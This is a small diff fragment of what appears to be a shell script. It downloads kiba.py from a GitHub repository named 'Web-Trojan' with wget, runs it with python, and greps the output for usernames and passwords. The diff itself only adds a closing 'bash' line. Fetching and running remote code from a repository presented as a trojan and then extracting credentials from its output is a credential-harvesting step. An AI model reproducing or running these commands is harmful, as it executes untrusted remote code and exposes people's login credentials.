@@ -20,3 +20,4 @@ wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/kiba.py -O k
 python /kiba.py > kiba.txt
 cat /kiba.txt | grep "Username"
 cat /kiba.txt | grep "Password"
+bash
